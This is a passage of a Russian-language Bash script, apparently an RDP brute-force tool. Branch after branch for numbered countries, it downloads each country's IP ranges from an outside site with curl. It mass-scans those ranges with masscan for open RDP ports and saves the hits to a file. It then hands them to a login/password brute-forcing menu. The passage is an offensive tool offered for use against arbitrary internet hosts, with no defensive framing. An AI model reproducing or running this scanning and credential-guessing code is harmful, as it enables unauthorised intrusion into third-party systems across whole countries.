echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "173" ]; then
curl http://ipdiapazon.16mb.com/Sudan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "174" ]; then
curl http://ipdiapazon.16mb.com/Suriname.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "175" ]; then
curl http://ipdiapazon.16mb.com/Swaziland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "176" ]; then
curl http://ipdiapazon.16mb.com/Sweden.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "177" ]; then
curl http://ipdiapazon.16mb.com/Switzerland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "178" ]; then
curl http://ipdiapazon.16mb.com/Syrian.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "179" ]; then
curl http://ipdiapazon.16mb.com/Taiwan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "180" ]; then
curl http://ipdiapazon.16mb.com/Tajikistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "181" ]; then
curl http://ipdiapazon.16mb.com/Tanzania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "182" ]; then
curl http://ipdiapazon.16mb.com/Thailand.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "183" ]; then
curl http://ipdiapazon.16mb.com/Togo.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "184" ]; then
curl http://ipdiapazon.16mb.com/Tonga.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "185" ]; then
curl http://ipdiapazon.16mb.com/Trinidad.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "186" ]; then
curl http://ipdiapazon.16mb.com/Tunisia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "187" ]; then
curl http://ipdiapazon.16mb.com/Turkey.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "188" ]; then
curl http://ipdiapazon.16mb.com/Turkmenistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "189" ]; then
curl http://ipdiapazon.16mb.com/Tuvalu.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "190" ]; then
curl http://ipdiapazon.16mb.com/Uganda.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "191" ]; then
